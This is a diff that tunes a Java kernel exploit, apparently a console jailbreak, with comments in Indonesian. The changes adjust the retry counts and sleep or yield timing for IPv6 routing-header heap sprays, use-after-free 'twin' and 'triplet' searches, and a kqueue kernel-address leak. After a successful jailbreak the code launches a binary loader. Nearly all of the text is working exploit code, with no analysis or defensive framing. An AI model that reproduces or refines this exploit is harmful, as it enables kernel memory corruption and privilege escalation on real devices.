@@ -20,10 +20,10 @@ public class Poops {
     private static final int MSG_IOV_NUM = 0x17;
     private static final int IOV_SIZE = 0x10;
 
-    private static final int IPV6_SOCK_NUM = 128;
+    private static final int IPV6_SOCK_NUM = 128;	// 128
 	private static final int TWIN_TRIES   = 4;
-	private static final int UAF_TRIES    = 100000;
-    private static final int KQUEUE_TRIES = 300000;
+	private static final int UAF_TRIES    = 60000;	// 50000
+    private static final int KQUEUE_TRIES = 300000;	// 300000
     private static final int IOV_THREAD_NUM = 8;	// 4
     private static final int UIO_THREAD_NUM = 8;	// 4
     private static final int PIPEBUF_SIZE = 0x18;
@@ -511,21 +511,21 @@ public class Poops {
 private static boolean findTwins() {
     int max_attempts = 4;
 
-    for (int attempt = 0; attempt < max_attempts; attempt++) {
+		for (int attempt = 0; attempt < max_attempts; attempt++) {
         console.println("Twins attempt " + (attempt + 1) + "/" + max_attempts);
 
         // Full reset sebelum spray
         for (int i = 0; i < ipv6Socks.length; i++) {
-            freeRthdr(ipv6Socks[i]);
+			freeRthdr(ipv6Socks[i]);
         }
-        try { Thread.sleep(1); } catch (Exception ignored) {}
+        try { Thread.sleep(50); } catch (Exception ignored) {}
 
         // Spray phase
         for (int i = 0; i < ipv6Socks.length; i++) {
             sprayRthdr.putInt(0x04, RTHDR_TAG | i);
             setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
         }
-        try { Thread.sleep(1); } catch (Exception ignored) {}
+        try { Thread.sleep(50); } catch (Exception ignored) {}
 
         // Search phase
         for (int i = 0; i < ipv6Socks.length; i++) {
@@ -544,7 +544,8 @@ private static boolean findTwins() {
             }
         }
         // console.println("No twins on attempt " + (attempt + 1) + ", retrying...");
-        try { Thread.sleep(2); } catch (Exception ignored) {}
+        sched_yield();
+		// try { Thread.sleep(2); } catch (Exception ignored) {}
     }
     // console.println("Find Twins failed after " + max_attempts + " attempts");
     return false;
@@ -559,7 +560,8 @@ private static int findTriplet(int master, int other, int timeout) {
             setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
         }
 
-        try { Thread.sleep(1); } catch (Exception ignored) {}
+        try { Thread.sleep(2); } catch (Exception ignored) {}
+		for (int y = 0; y < 5; y++) sched_yield();
 
         // Forward search
         leakRthdrLen.set(Int64.SIZE);
@@ -586,6 +588,7 @@ private static int findTriplet(int master, int other, int timeout) {
                 // console.println("Triplet founded");
                 return i;
             }
+			sched_yield();
         }
 
         try { Thread.sleep(1); } catch (Exception ignored) {}
@@ -683,17 +686,22 @@ private static int findTriplet(int master, int other, int timeout) {
 
             // Leak kqueue.
             int kq = 0;
+			int attempts = 0;
             while (timeout-- != 0) {
-                kq = kqueue();
-
-                // Leak with other rthdr.
+                attempts++;
+				kq = kqueue();
                 leakRthdrLen.set(0x100);
                 getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
+
                 if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(0x98) != 0) {
-                    break;
+                    console.println("Kqueue leak SUCCESS on attempt " + attempts);
+					break;
                 }
                 close(kq);
-				try { Thread.sleep(1); } catch (Exception ignored) {}
+				if (attempts % 500 == 0) {
+					console.println("Kqueue attempt: " + attempts + " (still trying...)");
+				}
+				try { Thread.sleep(2); } catch (Exception ignored) {}
             }
 
             if (timeout <= 0)
@@ -867,7 +875,7 @@ private static int findTriplet(int master, int other, int timeout) {
             __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
 
             // Stabilisasi loop
-            for (int i = 0; i < 32; i++) {
+            for (int i = 0; i < 32; i++) {	// bisa naikkan dari 32 menjadi 64 atau 128
                 iovState.signalWork(0);
                 sched_yield();
                 try { Thread.sleep(1); } catch (Exception ignored) {}
@@ -989,7 +997,7 @@ private static int findTriplet(int master, int other, int timeout) {
         if (Helper.isJailbroken()) {
             // NativeInvoke.sendNotificationRequest("Sudah terjailbreak");
 			NativeInvoke.sendNotificationRequest("Mengaktifkan Fan Control");
-			FanLoader.start();		
+			FanLoader.start();
             return 0;
         }
 
@@ -1032,7 +1040,11 @@ private static int findTriplet(int master, int other, int timeout) {
 
         cleanup();
         NativeInvoke.sendNotificationRequest("Berhasil");
-        BinLoader.start();
+        try {
+			Thread.sleep(50);
+		} catch (InterruptedException e) {
+		}
+		BinLoader.start();
         return 0;
     }
 
